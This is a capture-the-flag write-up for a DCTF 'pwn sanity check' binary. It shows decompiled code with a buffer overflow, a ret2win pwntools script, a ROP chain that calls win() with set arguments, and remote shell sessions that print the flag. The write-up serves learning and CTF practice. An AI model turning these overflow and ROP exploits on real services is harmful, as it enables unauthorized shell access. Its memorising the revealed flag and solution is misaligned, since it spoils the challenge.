This was a sanity check challenge for the PWN category. 

We were provided a 64-bit ELF file containing the following functions:

vuln():
```c
void vuln(void)

{
  char local_48 [60];
  int local_c;
  
  puts("tell me a joke");
  fgets(local_48,0x100,stdin);
  if (local_c == -0x21523f22) {
    puts("very good, here is a shell for you. ");
    shell();
  }
  else {
    puts("will this work?");
  }
  return;
}
```

shell():
```c
void shell(void)

{
  puts("spawning /bin/sh process");
  puts("wush!");
  printf("$> ");
  puts("If this is not good enough, you will just have to try harder :)");
  return;
}
```

win():
```c
void win(int param_1,int param_2)

{
  puts("you made it to win land, no free handouts this time, try harder");
  if (param_1 == -0x21524111) {
    puts("one down, one to go!");
    if (param_2 == 0x1337c0de) {
      puts("2/2 bro good job");
      system("/bin/sh");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  return;
}
```

I initially attempted a variable overwrite in order to reach the shell() function. Specially, I overwrote `local_c` so that it would equal `-0x21523f22` (which is equivalent to `0xdeadc0de`)


```console
root@osboxes:~/Downloads# python -c 'from pwn import *;print "A" * 60 + p64(0xdeadc0de)' | ./pwn_sanity_check 
tell me a joke
very good, here is a shell for you. 
spawning /bin/sh process
wush!
$> If this is not good enough, you will just have to try harder :)
```

Clearly this was a rabbit-hole, as the shell() function does not actually produce a shell, it merely prints text. What we REALLY want is to reach the win() function which contains the `system("/bin/sh");` command. 

We can use GDB to pull the address for the win() function:

```console
(gdb) disas win
Dump of assembler code for function win:
   0x0000000000400697 <+0>:	push   %rbp
   0x0000000000400698 <+1>:	mov    %rsp,%rbp
   0x000000000040069b <+4>:	sub    $0x10,%rsp
   0x000000000040069f <+8>:	mov    %edi,-0x4(%rbp)
   0x00000000004006a2 <+11>:	mov    %esi,-0x8(%rbp)
   0x00000000004006a5 <+14>:	lea    0x18c(%rip),%rdi        # 0x400838
   0x00000000004006ac <+21>:	call   0x400550 <puts@plt>
   0x00000000004006b1 <+26>:	cmpl   $0xdeadbeef,-0x4(%rbp)
   0x00000000004006b8 <+33>:	jne    0x4006f1 <win+90>
   0x00000000004006ba <+35>:	lea    0x1b7(%rip),%rdi        # 0x400878
   0x00000000004006c1 <+42>:	call   0x400550 <puts@plt>
   0x00000000004006c6 <+47>:	cmpl   $0x1337c0de,-0x8(%rbp)
   0x00000000004006cd <+54>:	jne    0x4006f1 <win+90>
   0x00000000004006cf <+56>:	lea    0x1b7(%rip),%rdi        # 0x40088d
   0x00000000004006d6 <+63>:	call   0x400550 <puts@plt>
   0x00000000004006db <+68>:	lea    0x1bc(%rip),%rdi        # 0x40089e
   0x00000000004006e2 <+75>:	call   0x400560 <system@plt>
   0x00000000004006e7 <+80>:	mov    $0x0,%edi
   0x00000000004006ec <+85>:	call   0x4005a0 <exit@plt>
   0x00000000004006f1 <+90>:	nop
   0x00000000004006f2 <+91>:	leave  
   0x00000000004006f3 <+92>:	ret    
End of assembler dump.
```

One idea is take advantage of the precise location where `system("/bin/sh");` is called (which can be identified in either GDB or Ghidra):

```py
root@osboxes:~/Downloads# cat pwn_sanity_chk.py
from pwn import *

HOST = 'dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io'
PORT = 7480

sh = remote(HOST, PORT)

print sh.recv()

payload = 'A' * 72
payload += p64(0x004006db)

sh.sendline(payload)
sh.interactive()
```

Running this script yields an interactive session:

```console
root@osboxes:~/Downloads# python pwn_sanity_chk.py 
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
tell me a joke

[*] Switching to interactive mode
will this work?
$ whoami
pilot
$ ls
flag.txt
pwn_sanity_check
startService.sh
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
[*] Got EOF while reading in interactive
$  
```

The flag is **dctf{Ju5t_m0v3_0n}**.


For learning purposes, there is another approach where we don't just skip to the `system("/bin/sh")` call. This involves a Return Oriented Programming (ROP) technique. More information can be found [here](https://ctf101.org/binary-exploitation/return-oriented-programming/), but essentially we chain small snippets of assembly together to enable us to jump to any function we want. Sample code is below:

```py
root@osboxes:~/Downloads# cat pwn_sanity_chk2.py 
from pwn import *

binary = context.binary = ELF('./pwn_sanity_check')

if args.REMOTE:
    p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
else:
    p = process(binary.path)

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += 0x48 * b'A'
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter('joke\n',payload)
p.interactive()
```


And output from running the script:

```console
root@osboxes:~/Downloads# python pwn_sanity_chk2.py REMOTE
[*] '/root/Downloads/pwn_sanity_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
will this work?
you made it to win land, no free handouts this time, try harder
one down, one to go!
2/2 bro good job
$ ls
flag.txt
pwn_sanity_check
startService.sh
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
[*] Got EOF while reading in interactive
$  
```

